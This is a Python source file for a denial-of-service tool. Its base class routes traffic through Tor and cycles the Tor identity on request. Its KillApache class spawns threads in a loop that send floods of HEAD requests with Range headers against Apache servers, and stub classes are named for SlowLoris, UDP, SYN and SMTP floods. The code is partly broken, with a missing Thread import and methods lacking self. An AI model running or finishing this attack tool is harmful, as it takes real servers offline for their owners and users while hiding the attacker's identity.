import threading
import socket
import socks
from Events import *
class Flooder(threading.Thread):
    def __init__(self,tor=False):
        self._tor = tor
        self.on = True
        self.threads = 50
    def socket(self):
        sock = socket.socket()
        if self._tor:
            sock = socks.socksocket(_sock=sock)
            sock.settimeout(30)
            sock.setproxy(proxytype=socks.PROXY_TYPE_SOCKS5,addr='127.0.0.1',port=9050)
        return sock
    
    def cycle(self,auth=''):
        if not self._tor:
            return
        sock = socket.socket()
        try:
            sock.connect(('127.0.0.1',9051))
            sock.send('AUTHENTICATE "%s"\r\nsignal NEWNYM\r\n'%auth)
            sock.close()
        except:
            getEventManager().signalEvent(Event(ERR,'Failure To Cycle Tor Identity'))


class KillApache(Flooder):
    def run(self):
        while self.on:
            threads = []
            for n in range(self.threads):
                t = Thread(target=self.kill_apache,args=())
                threads.append(t)
                t.start()
            
    def kill_apache():
        sock = self.socket()
        sock.connect(self.target)
        for n in range(1300):
            data = 'HEAD / HTTP/1.1\r\nHost: %s\r\nRange:bytes=0-%d\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n' % (self.target[0],n)
            sock.send(data)
        sock.close()

class SlowLoris(Flooder):
    pass

class HTTP(Flooder):
    pass

class UDP(Flooder):
    pass

class SYN(Flooder):
    pass

class TCP(Flooder):
    pass
            
class SMTP(Flooder):
    pass
